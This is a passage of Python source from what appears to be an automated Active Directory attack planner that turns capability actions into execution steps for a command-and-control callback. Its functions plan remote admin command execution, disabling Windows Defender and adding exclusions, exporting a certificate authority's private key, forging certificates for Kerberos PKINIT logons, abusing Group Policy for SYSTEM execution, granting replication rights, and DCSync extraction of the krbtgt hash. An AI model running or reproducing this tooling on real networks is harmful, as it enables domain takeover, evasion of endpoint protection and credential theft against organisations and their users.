        missing.append("callback_id")
    if not password:
        missing.append("password")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="use-managed-local-admin-secret needs target host/domain, callback id, and secret material",
        )

    proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
    if not proof_resource:
        proof_resource = f"\\\\{_host_fqdn(target_host, target_domain)}\\C$"
    process = _input_text(inputs, "process", "sacrificial_process", "run")

    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="local-admin-logon-session-create",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "local_account": local_account,
                    "password": password,
                    "callback_id": callback_id,
                    "netonly": True,
                    **({"credential_id": credential_id} if credential_id else {}),
                    **({"process": process} if process else {}),
                },
                capability=action.name,
                purpose=f"create isolated NetOnly context for {target_host}\\{local_account}",
                expected_probe="extract_local_admin_context_probe",
                prerequisites=[
                    _managed_local_admin_secret_effect(target_host, target_domain),
                    f"live-callback:{callback_id}",
                ],
            ),
            CapabilityExecutionStep(
                operation="local-admin-service-proof",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "resource": proof_resource,
                    "target_context": "{{local_admin_logon_context}}",
                    "callback_id": callback_id,
                },
                capability=action.name,
                purpose=f"prove local admin access to {proof_resource}",
                expected_probe="extract_local_admin_access_probe",
                prerequisites=[
                    "context:local_admin_logon_context",
                    "resource:admin_share",
                ],
            ),
        ],
        reason="built generic isolated local-admin context plus admin-share proof steps",
    )


def _build_execute_as_local_admin_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "domain", "realm")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    target_host, inferred_domain = _host_domain_from_target(
        _input_text(inputs, "target_host", "host", "computer", "target")
        or action.intent.get("target_host")
        or action.intent.get("host")
        or action.intent.get("computer")
        or fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    if not target_domain:
        target_domain = inferred_domain
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    local_account = _input_text(inputs, "local_account", "local_user", "username", "user") \
        or action.intent.get("local_account") \
        or action.intent.get("local_user") \
        or "Administrator"
    password = _input_text(
        inputs,
        "password",
        "local_admin_password",
        "managed_local_admin_secret",
        "secret",
        "credential",
        "credential_text",
    ) or action.intent.get("password")
    missing = []
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not callback_id:
        missing.append("callback_id")
    if not password:
        missing.append("password")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="execute-as-local-admin needs target host/domain, callback id, and local-admin secret material",
        )

    proof_marker = _input_text(inputs, "proof_marker", "marker") or \
        f"SAGE_REMOTE_EXEC_PROOF_{_slug(target_host)}_{_slug(callback_id)}"
    proof_path, proof_unc = _normalize_remote_exec_proof_paths(
        target_host,
        target_domain,
        callback_id,
        _input_text(inputs, "proof_path", "remote_proof_path"),
        _input_text(inputs, "proof_unc", "proof_resource", "target_resource"),
    )
    remote_command = _input_text(inputs, "remote_command", "command")
    if not remote_command:
        remote_command = (
            f'cmd.exe /c echo {proof_marker} '
            f'& whoami '
            f'& hostname '
            f'& echo {proof_marker} > "{proof_path}" '
            f'& whoami >> "{proof_path}" '
            f'& hostname >> "{proof_path}"'
        )
    method = _normalize(_input_text(inputs, "method", "execution_method") or "wmiexecute")

    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="local-admin-remote-command",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "local_account": local_account,
                    "password": password,
                    "callback_id": callback_id,
                    "method": method,
                    "command": remote_command,
                    "proof_path": proof_path,
                    "proof_marker": proof_marker,
                },
                capability=action.name,
                purpose=f"execute bounded proof command on {target_host}@{target_domain} with verified local admin rights",
                expected_probe="extract_remote_execution_submit_probe",
                prerequisites=[
                    _local_admin_effect(target_host, target_domain),
                    f"live-callback:{callback_id}",
                ],
            ),
            CapabilityExecutionStep(
                operation="remote-file-read",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "path": proof_unc,
                    "proof_marker": proof_marker,
                    "callback_id": callback_id,
                },
                capability=action.name,
                purpose=f"read target-side proof file from {proof_unc}",
                expected_probe="extract_remote_execution_probe",
                prerequisites=[
                    "remote_process_created",
                    _local_admin_effect(target_host, target_domain),
                ],
            ),
        ],
        reason="built generic remote local-admin execution plus proof-file read steps",
    )


def _build_endpoint_protection_adjustment_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "domain", "realm")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    target_host, inferred_domain = _host_domain_from_target(
        _input_text(inputs, "target_host", "host", "computer", "target")
        or action.intent.get("target_host")
        or action.intent.get("host")
        or action.intent.get("computer")
        or fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    if not target_domain:
        target_domain = inferred_domain
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    provider = _normalize(_input_text(inputs, "provider", "endpoint_provider") or action.intent.get("provider") or "windows-defender")
    local_account = _input_text(inputs, "local_account", "local_user", "username", "user") \
        or action.intent.get("local_account") \
        or "Administrator"
    password = _input_text(
        inputs,
        "password",
        "local_admin_password",
        "managed_local_admin_secret",
        "secret",
        "credential",
        "credential_text",
    ) or action.intent.get("password")
    method = _normalize(_input_text(inputs, "method", "endpoint_method", "adjustment_method") or action.intent.get("method"))
    if not method:
        method = "remote-wmi" if password else "local"
    actions = _input_list(inputs, "actions", "endpoint_actions", "protection_actions") \
        or _input_list(action.intent, "actions", "endpoint_actions", "protection_actions") \
        or ["disable_realtime", "add_exclusion"]
    exclusion_paths = _input_list(inputs, "exclusion_paths", "exclusions", "exclusion_path") \
        or _input_list(action.intent, "exclusion_paths", "exclusions", "exclusion_path") \
        or [r"C:\Windows\Temp"]
    wait_seconds = _input_text(inputs, "wait_seconds", "remote_wait_seconds") or "10"

    missing = []
    if provider not in {"windows-defender", "defender", "microsoft-defender"}:
        missing.append("provider")
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not callback_id:
        missing.append("callback_id")
    if method in {"remote-wmi", "wmi", "remote"} and not password:
        missing.append("password")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason=(
                "endpoint-protection-adjustment needs target host/domain, callback id, "
                "and local-admin secret material for remote adjustment"
            ),
        )

    slug = _slug("_".join(part for part in (target_host, callback_id) if part))
    proof_marker = _input_text(inputs, "proof_marker", "adjustment_marker", "marker") or f"SAGE_EP_ADJUST_PROOF_{slug}"
    output_path = _input_text(inputs, "output_path", "remote_output_path") or f"C:\\Windows\\Temp\\sage_ep_adjust_{slug}.txt"
    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="endpoint-protection-adjustment",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "callback_id": callback_id,
                    "provider": provider,
                    "method": method,
                    "local_account": local_account,
                    "password": password,
                    "actions": actions,
                    "exclusion_paths": exclusion_paths,
                    "proof_marker": proof_marker,
                    "output_path": output_path,
                    "wait_seconds": wait_seconds,
                },
                capability=action.name,
                purpose=f"verify and adjust endpoint protection on {target_host}@{target_domain}",
                expected_probe="extract_endpoint_protection_probe",
                prerequisites=[
                    _remote_exec_effect(target_host, target_domain),
                    _local_admin_effect(target_host, target_domain),
                    f"live-callback:{callback_id}",
                ],
            )
        ],
        reason="built generic endpoint-protection status/change/proof step",
    )


def _build_adcs_ca_private_key_export_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "domain", "realm")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    raw_target_host = (
        _input_text(inputs, "target_host", "host", "computer", "target")
        or action.intent.get("target_host")
        or action.intent.get("host")
        or action.intent.get("computer")
        or fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    target_host, inferred_domain = _host_domain_from_target(raw_target_host)
    if not target_domain:
        target_domain = inferred_domain
    target_host = canonical_host_for_domain(raw_target_host or target_host, target_domain)
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    local_account = _input_text(inputs, "local_account", "local_user", "username", "user") \
        or action.intent.get("local_account") \
        or action.intent.get("local_user") \
        or "Administrator"
    password = _input_text(
        inputs,
        "password",
        "local_admin_password",
        "managed_local_admin_secret",
        "secret",
        "credential",
        "credential_text",
    ) or action.intent.get("password")
    missing = []
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not callback_id:
        missing.append("callback_id")
    if not password:
        missing.append("password")
    if not _input_text(inputs, "pfx_password", "certificate_password"):
        missing.append("pfx_password")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="adcs-ca-private-key-export needs target host/domain, callback id, and local-admin secret material",
        )

    slug = _slug("_".join(part for part in (target_host, callback_id) if part))
    proof_marker = _input_text(inputs, "proof_marker", "export_marker", "marker") or f"SAGE_CA_EXPORT_PROOF_{slug}"
    pfx_path = _input_text(inputs, "pfx_path", "remote_pfx_path") or f"C:\\Windows\\Temp\\sage_ca_export_{slug}.pfx"
    metadata_path = _input_text(inputs, "metadata_path", "meta_path", "remote_metadata_path") or \
        f"C:\\Windows\\Temp\\sage_ca_export_{slug}.txt"
    pfx_password = _input_text(inputs, "pfx_password", "certificate_password")
    method = _normalize(_input_text(inputs, "adcs_ca_export_method", "ca_export_method", "export_method") or "certutil-backupkey")
    dpapi_methods = {"sharpdpapi", "dpapi", "machine-dpapi", "machine_dpapi"}
    certutil_methods = {"certutil", "certutil-backupkey", "certutil_backupkey", "ca-backup", "ca_backup"}
    wait_seconds = _input_text(inputs, "wait_seconds", "remote_wait_seconds") or (
        "90" if method in dpapi_methods else "45" if method in certutil_methods else "8"
    )
    if method in dpapi_methods:
        tool_name = _input_text(inputs, "dpapi_tool", "tool") or "SharpDPAPI.exe"
        tool_file_uuid = _input_text(inputs, "tool_file_uuid", "dpapi_tool_file_uuid", "file_uuid")
        staged_tool_path = _input_text(inputs, "staged_tool_path", "tool_path") or f"C:\\Windows\\Temp\\{tool_name}"
        output_path = _input_text(inputs, "output_path", "remote_output_path") or \
            f"C:\\Windows\\Temp\\sage_ca_dpapi_{slug}.txt"
        parameters = {
            "target_host": target_host,
            "target_domain": target_domain,
            "local_account": local_account,
            "password": password,
            "callback_id": callback_id,
            "proof_marker": proof_marker,
            "tool": tool_name,
            "staged_tool_path": staged_tool_path,
            "output_path": output_path,
            "wait_seconds": wait_seconds,
        }
        if tool_file_uuid:
            parameters["tool_file_uuid"] = tool_file_uuid
        return CapabilityExecutionPlan(
            True,
            steps=[
                CapabilityExecutionStep(
                    operation="adcs-ca-private-key-dpapi-export",
                    parameters=parameters,
                    capability=action.name,
                    purpose=f"extract ADCS CA private key from {target_host}@{target_domain} with machine DPAPI",
                    expected_probe="extract_adcs_ca_private_key_probe",
                    prerequisites=[
                        _remote_exec_effect(target_host, target_domain),
                        _local_admin_effect(target_host, target_domain),
                        f"live-callback:{callback_id}",
                        f"tool:{tool_name}",
                    ],
                )
            ],
            reason="built generic SharpDPAPI machine-certificate export fallback for non-exportable CA keys",
        )

    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="adcs-ca-private-key-export",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "local_account": local_account,
                    "password": password,
                    "callback_id": callback_id,
                    "proof_marker": proof_marker,
                    "pfx_path": pfx_path,
                    "metadata_path": metadata_path,
                    "pfx_password": pfx_password,
                    "wait_seconds": wait_seconds,
                    "adcs_ca_export_method": method,
                },
                capability=action.name,
                purpose=f"export ADCS CA signing certificate/private key from {target_host}@{target_domain}",
                expected_probe="extract_adcs_ca_private_key_probe",
                prerequisites=[
                    _remote_exec_effect(target_host, target_domain),
                    _local_admin_effect(target_host, target_domain),
                    f"live-callback:{callback_id}",
                ],
            )
        ],
        reason="built generic ADCS CA private-key export and proof-read step",
    )


def _build_adcs_esc_certificate_enroll_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(
        _input_text(inputs, "domain", "target_domain", "realm")
        or action.intent.get("domain")
        or action.intent.get("target_domain")
        or fields.get("domain")
        or fields.get("target_domain")
    )
    account = _normalize(
        _input_text(inputs, "account", "user", "principal", "target_account")
        or action.intent.get("account")
        or action.intent.get("user")
        or fields.get("account")
        or "administrator"
    )
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    ca_host = _host_short(
        _input_text(inputs, "ca_host", "target_host", "host", "computer")
        or action.intent.get("ca_host")
        or action.intent.get("target_host")
        or fields.get("ca_host")
        or fields.get("target")
    )
    ca_name = _input_text(inputs, "ca_name", "certificate_authority", "ca") or action.intent.get("ca_name")
    template = _input_text(inputs, "template", "certificate_template", "adcs_template") or action.intent.get("template")
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not callback_id:
        missing.append("callback_id")
    if not ca_name:
        missing.append("ca_name")
    if not template:
        missing.append("template")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="adcs-esc-certificate-enroll needs target account/domain, callback id, CA name, and template",
        )

    slug = _slug("_".join(part for part in (account, domain, callback_id) if part))
    proof_marker = _input_text(inputs, "proof_marker", "enroll_marker", "marker") or f"SAGE_CERT_ENROLL_PROOF_{slug}"
    certificate_path = _input_text(
        inputs,
        "certificate_path",
        "forged_pfx_path",
        "forged_certificate_path",
        "new_cert_path",
    ) or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
    certificate_password = _input_text(
        inputs,
        "certificate_password",
        "forged_pfx_password",
        "forged_certificate_password",
        "new_cert_password",
    ) or artifact_secret("SageCert", slug)
    subject = _input_text(inputs, "subject", "certificate_subject") or f"CN={account}"
    subject_alt_name = _input_text(inputs, "subject_alt_name", "san", "upn") or f"{account}@{domain}"
    esc_type = _normalize(_input_text(inputs, "esc_type", "adcs_esc", "esc") or action.intent.get("esc_type") or "esc1")

    parameters = {
        "domain": domain,
        "account": account,
        "callback_id": callback_id,
        "ca_host": ca_host,
        "ca_name": ca_name,
        "template": template,
        "esc_type": esc_type,
        "subject": subject,
        "subject_alt_name": subject_alt_name,
        "certificate_path": certificate_path,
        "certificate_password": certificate_password,
        "proof_marker": proof_marker,
    }
    for key in ("on_behalf_of", "enrollment_agent_certificate_path", "enrollment_agent_certificate_password"):
        value = _input_text(inputs, key)
        if value:
            parameters[key] = value

    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="adcs-esc-certificate-enroll",
                parameters=parameters,
                capability=action.name,
                purpose=f"request an ADCS ESC certificate for {account}@{domain}",
                expected_probe="extract_adcs_enrolled_certificate_probe",
                prerequisites=[f"live-callback:{callback_id}", "adcs:enrollable-template"],
            )
        ],
        reason="built generic ADCS ESC enrollment step",
    )


def _build_adcs_certificate_auth_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(
        _input_text(inputs, "domain", "target_domain", "realm")
        or action.intent.get("domain")
        or action.intent.get("target_domain")
        or fields.get("domain")
        or fields.get("target_domain")
    )
    account = _normalize(
        _input_text(inputs, "account", "user", "principal", "target_account")
        or action.intent.get("account")
        or action.intent.get("user")
        or action.intent.get("principal")
        or fields.get("account")
        or fields.get("user")
        or fields.get("principal")
        or "administrator"
    )
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    certificate_already_forged = (
        _input_bool(inputs, "certificate_already_forged", default=False)
        or _input_bool(inputs, "skip_certificate_forge", default=False)
        or _input_bool(inputs, "pre_forged_certificate", default=False)
        or bool(action.intent.get("certificate_already_forged"))
        or bool(action.intent.get("skip_certificate_forge"))
        or bool(action.intent.get("pre_forged_certificate"))
    )
    ca_pfx_path = _input_text(inputs, "ca_pfx_path", "ca_cert_path", "ca_certificate_path")
    ca_pfx_password = _input_text(inputs, "ca_pfx_password", "ca_cert_password", "ca_certificate_password")
    # PKINIT must target a KDC, not whichever host happens to be used for
    # post-auth service proof. A CA host is a valid proof target but is not
    # necessarily a domain controller.
    dc = _input_text(inputs, "dc", "domain_controller")
    auth_method = _normalize(
        _input_text(inputs, "certificate_auth_method", "adcs_certificate_auth_method", "auth_method")
        or "pkinit-kerberos"
    )
    schannel_ldap = auth_method in {"schannel", "schannel-ldap", "ldap-schannel", "ldaps", "certificate-ldap"}
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not callback_id:
        missing.append("callback_id")
    if not ca_pfx_path and not certificate_already_forged:
        missing.append("ca_pfx_path")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason=(
                "adcs-certificate-auth needs target account/domain, callback id, and either a staged CA PFX "
                "path or certificate_already_forged=true with a staged forged certificate"
            ),
        )

    slug = _slug("_".join(part for part in (account, domain, callback_id) if part))
    forged_pfx_path = _input_text(
        inputs,
        "forged_pfx_path",
        "forged_certificate_path",
        "new_cert_path",
        "certificate_path",
    ) or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
    forged_pfx_password = _input_text(
        inputs,
        "forged_pfx_password",
        "forged_certificate_password",
        "new_cert_password",
        "certificate_password",
    ) or artifact_secret("SageCert", slug)
    subject = _input_text(inputs, "subject", "certificate_subject") or f"CN={account}"
    subject_alt_name = _input_text(inputs, "subject_alt_name", "san", "upn") or f"{account}@{domain}"
    account_sid = _input_text(inputs, "account_sid", "target_sid", "principal_sid")

    proof_host = _input_text(inputs, "proof_host", "service_host", "target_host", "dc", "domain_controller")
    proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
    if not proof_resource and proof_host:
        proof_resource = f"\\\\{proof_host}\\C$"
    if not proof_resource:
        proof_resource = "{{kerberos_service_resource}}"

    context_strategy = _normalize(
        _input_text(inputs, "kerberos_context_strategy", "ticket_strategy", "ticket_store")
        or "ticket-store-fork-run"
    )
    context_password = _input_text(inputs, "context_password", "logon_password") or "SageNetOnlyContext1!"
    context_process = _input_text(inputs, "context_process", "sacrificial_process", "run")
    proof_marker = _input_text(inputs, "proof_marker", "auth_marker", "marker") or f"SAGE_CERT_AUTH_PROOF_{slug}"
    ldap_server = _input_text(
        inputs,
        "ldap_server",
        "ldaps_server",
        "domain_controller",
        "dc",
        "proof_host",
        "service_host",
    ) or domain
    search_base = _input_text(inputs, "search_base", "base_dn") or _domain_dn(domain)

    steps: list[CapabilityExecutionStep] = []
    if _input_bool(inputs, "preflight_existing_context", default=not schannel_ldap):
        steps.extend([
            CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={
                    "domain": domain,
                    "account": account,
                    "target_context": "current",
                    "store": "current",
                },
                capability=action.name,
                purpose=f"inventory current Kerberos context for {account}@{domain} before certificate auth",
                expected_probe="extract_account_ticket_cache_probe",
            ),
            CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "domain": domain,
                    "account": account,
                    "resource": proof_resource,
                    "target_context": "current",
                    "store": "current",
                    "action": "list",
                    "requires_import": False,
                },
                capability=action.name,
                purpose=(
                    "prove whether the current callback context already has target service access; "
                    "if this succeeds, do not forge/import/create another Kerberos context"
                ),
                expected_probe="extract_ticket_probe",
                prerequisites=["context:current-kerberos-context"],
            ),
        ])

    if not certificate_already_forged:
        steps.append(CapabilityExecutionStep(
            operation="adcs-certificate-forge",
            parameters={
                "domain": domain,
                "account": account,
                "account_sid": account_sid,
                "ca_pfx_path": ca_pfx_path,
                "ca_pfx_password": ca_pfx_password,
                "subject": subject,
                "subject_alt_name": subject_alt_name,
                "forged_pfx_path": forged_pfx_path,
                "forged_pfx_password": forged_pfx_password,
                "certificate_profile": "windows-pkinit-smartcard-logon",
                "crl_distribution_points": ["ldap:///"],
                "include_authority_key_identifier": True,
                "include_subject_key_identifier": True,
                "include_basic_constraints": True,
            },
            capability=action.name,
            purpose=f"forge an offline ADCS certificate for {account}@{domain} with verified CA signing material",
            expected_probe="extract_forged_certificate_probe",
            prerequisites=["artifact:adcs_ca_private_key"],
        ))

    if schannel_ldap:
        steps.append(CapabilityExecutionStep(
            operation="certificate-schannel-ldap-proof",
            parameters={
                "domain": domain,
                "account": account,
                "certificate_path": forged_pfx_path,
                "certificate_password": forged_pfx_password,
                "domain_controller": ldap_server,
                "search_base": search_base,
                "proof_marker": proof_marker,
                "certificate_auth_method": "schannel-ldap",
            },
            capability=action.name,
            purpose=f"prove LDAP Schannel certificate authentication for {account}@{domain}",
            expected_probe="extract_adcs_certificate_auth_probe",
            prerequisites=[
                "artifact:forged_certificate_pfx"
                if not certificate_already_forged else
                "artifact:pre_forged_certificate_pfx"
            ],
        ))
        return CapabilityExecutionPlan(
            True,
            steps=steps,
            reason="built generic ADCS certificate forge and Schannel LDAP proof steps",
        )

    steps.extend([
        CapabilityExecutionStep(
            operation="certificate-pkinit-tgt",
            parameters={
                "domain": domain,
                "user": account,
                "certificate_path": forged_pfx_path,
                "certificate_password": forged_pfx_password,
                "output_format": "base64-ticket",
                "getcredentials": True,
                "show": True,
                "nowrap": True,
                **({"dc": dc} if dc else {}),
            },
            capability=action.name,
            purpose=f"request a PKINIT TGT artifact for {account}@{domain} from the forged certificate",
            expected_probe="extract_certificate_pkinit_probe",
            prerequisites=[
                "artifact:forged_certificate_pfx"
                if not certificate_already_forged else
                "artifact:pre_forged_certificate_pfx"
            ],
        ),
        CapabilityExecutionStep(
            operation="kerberos-logon-session-create",
            parameters={
                "domain": domain,
                "user": account,
                "password": context_password,
                "netonly": True,
                **({"process": context_process} if context_process else {}),
            },
            capability=action.name,
            purpose=f"create an isolated Kerberos logon context for {account}@{domain}",
            expected_probe="extract_logon_context_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-import",
            parameters={
                "domain": domain,
                "user": account,
                "ticket_artifact": "{{kerberos_ticket_base64}}",
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
            },
            capability=action.name,
            purpose="import the PKINIT TGT into the isolated Kerberos context",
            expected_probe="extract_ticket_import_probe",
            prerequisites=["artifact:kerberos_ticket_base64", "context:kerberos_logon_context"],
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-list",
            parameters={
                "domain": domain,
                "account": account,
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
            },
            capability=action.name,
            purpose="verify the isolated context contains the PKINIT ticket",
            expected_probe="extract_account_ticket_cache_probe",
            prerequisites=["context:kerberos_logon_context"],
        ),
        CapabilityExecutionStep(
            operation="kerberos-context-service-proof",
            parameters={
                "domain": domain,
                "account": account,
                "resource": proof_resource,
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
                "action": "list",
                "proof_marker": proof_marker,
            },
            capability=action.name,
            purpose=f"prove service access using the {account}@{domain} certificate-auth Kerberos context",
            expected_probe="extract_adcs_certificate_auth_probe",
            prerequisites=[
                "artifact:kerberos_ticket_base64",
                "context:kerberos_logon_context",
                "ticket:kerberos_ticket_imported",
                "resource:kerberos_service_resource",
            ],
        ),
    ])
    return CapabilityExecutionPlan(
        True,
        steps=steps,
        reason="built generic ADCS certificate forge, PKINIT, isolated ticket import, and service-proof steps",
    )


def _ldap_extended_right_grant_step(
    tool: str,
    capability: str,
    purpose: str,
    target_dn: str,
    principal: str,
    right_name: str,
    guid: str,
) -> CapabilityExecutionStep:
    return CapabilityExecutionStep(
        operation="ldap-extended-right-grant",
        parameters={
            "tool": tool,
            "target_dn": target_dn,
            "principal": principal,
            "right": right_name,
            "guid": guid,
        },
        capability=capability,
        purpose=purpose,
        expected_probe="extract_directory_rights_probe",
    )


def _gpo_controlled_system_exec_action(
    gpo: str,
    domain: str,
    note: str = "",
    gpo_guid: str = "",
    affected_hosts: list[str] | None = None,
    affected_dc_hosts: list[str] | None = None,
) -> CapabilityAction:
    target = f"gpo={gpo};domain={domain}"
    dc_hosts = sorted({_normalize(host) for host in (affected_dc_hosts or []) if _normalize(host)})
    all_hosts = sorted({
        _normalize(host)
        for host in [*(affected_hosts or []), *dc_hosts]
        if _normalize(host)
    })
    reason = note or "controlled GPO can deliver a computer-side SYSTEM action; prove execution before chaining"
    if all_hosts:
        reason = f"{reason}; BloodHound scope includes host(s): {', '.join(all_hosts)}"
    if dc_hosts:
        reason = f"{reason}; BloodHound scope includes DC host(s): {', '.join(dc_hosts)}"
    source_facts = [f"generic-write:gpo:{gpo}", f"gpo-domain:{gpo}:{domain}"]
    source_facts.extend(f"gpo-affects-computer:{gpo}:{host}:{domain}" for host in all_hosts)
    source_facts.extend(f"gpo-affects-dc:{gpo}:{host}:{domain}" for host in dc_hosts)
    effects = [f"system-exec:gpo:{gpo}@{domain}"]
    if dc_hosts:
        effects.append(f"da:{domain}")
    return CapabilityAction(
        name="gpo-controlled-system-exec",
        target=target,
        preconditions=[
            f"generic-write:gpo:{gpo}",
            f"gpo-domain:{gpo}:{domain}",
            f"live-foothold:{domain}",
        ],
        effects=effects,
        intent={
            "capability": "gpo-controlled-system-exec",
            "gpo": gpo,
            "domain": domain,
            "gpo_guid": gpo_guid,
            "affected_hosts": all_hosts,
            "affected_dc_hosts": dc_hosts,
            "preferred_effect": "domain-admin-membership" if dc_hosts else "system-exec-proof",
            "steps": [
                "select an affected computer or domain scope from BloodHound",
                "stage a payload or command that can run under the GPO computer context",
                "write or repair the computer-side GPO artifact",
                "synchronize GPT.INI and LDAP versioning/CSE state",
                "trigger or wait for Group Policy refresh",
            ],
        },
        verifier={
            "achieved_any": ["system_callback_observed", "system_command_succeeded"],
            "setup_all": [
                "scheduled_task_xml_valid",
                "gpt_ini_version_bumped",
                "ldap_version_bumped",
                "command_path_present",
            ],
            "blockers": [
                "defender_blocked",
                "payload_quarantined",
                "xml_invalid",
                "xml_empty",
                "xml_save_locked",
                "gpupdate_failed",
                "command_path_missing",
            ],
        },
        reason=reason,
        source_facts=[
            *source_facts,
            *([f"gpo-guid:{gpo}:{gpo_guid}"] if gpo_guid else []),
        ],
        operational_cost=gpo_operational_cost(),
    )


def _grant_directory_rights_action(gpo: str, domain: str) -> CapabilityAction:
    target = f"domain={domain};source=gpo-system-exec:{gpo}"
    return CapabilityAction(
        name="grant-directory-rights",
        target=target,
        preconditions=[
            f"system-exec:gpo:{gpo}@{domain}",
            f"live-foothold:{domain}",
        ],
        effects=[f"ds-replication-rights:{domain}"],
        intent={
            "capability": "grant-directory-rights",
            "domain": domain,
            "execution_context": f"gpo-system-exec:{gpo}",
            "rights": [
                "DS-Replication-Get-Changes",
                "DS-Replication-Get-Changes-All",
                "DS-Replication-Get-Changes-In-Filtered-Set",
            ],
            "steps": [
                "resolve the target domain DN and controlled principal/SID from BloodHound or live identity",
                "apply the replication-right ACEs from the obtained execution context",
                "enumerate the target ACL after the write",
                "record success only when the replication rights are visible on the ACL",
            ],
        },
        verifier={
            "achieved_all": ["ds_replication_rights"],
            "partial_any": [
                "ace_present",
                "get_changes",
                "get_changes_all",
                "get_changes_in_filtered_set",
            ],
            "blockers": [
                "access_denied",
                "principal_not_found",
                "target_not_found",
                "acl_write_failed",
                "execution_context_missing",
            ],
        },
        reason="SYSTEM execution context can apply directory ACLs; verify the ACE before any DCSync",
        source_facts=[f"system-exec:gpo:{gpo}@{domain}"],
        operational_cost=gpo_operational_cost(),
    )


def _dcsync_krbtgt_action(domain: str, context_callback_id: str = "") -> CapabilityAction:
    context_effect = _kerberos_context_effect(domain, context_callback_id) if context_callback_id else ""
    preconditions = [
        f"ds-replication-rights:{domain}",
        "live-foothold:*",
    ]
    source_facts = [f"ds-replication-rights:{domain}"]
    if context_effect:
        preconditions.append(context_effect)
        source_facts.append(context_effect)
    return CapabilityAction(
        name="dcsync-krbtgt",
        target=f"domain={domain};account=krbtgt",
        preconditions=preconditions,
        effects=[f"krbtgt-hash:{domain}"],
        intent={
            "capability": "dcsync-krbtgt",
            "domain": domain,
            "account": "krbtgt",
            "steps": [
                "select a reachable domain controller for the domain",
                "perform a replication request for krbtgt using the verified replication-capable context",
                "extract a real NTLM/AES/RC4 secret from the output",
                "record success only when the secret material is present and non-placeholder",
            ],
        },
        verifier={
            "achieved_any": ["krbtgt_hash_present", "credentials_dumped"],
            "partial_any": ["secretsdump_connected", "dcsync_started", "domain_hashes_dumped"],
            "blockers": [
                "replication_access_denied",
                "access_denied",
                "bad_dn",
                "principal_not_found",
                "target_not_found",
                "dc_unreachable",
            ],
        },
        reason="verified replication rights can extract krbtgt; record only real secret material",
        source_facts=source_facts,
    )


def _dcsync_account_action(
    domain: str,
    account: str,
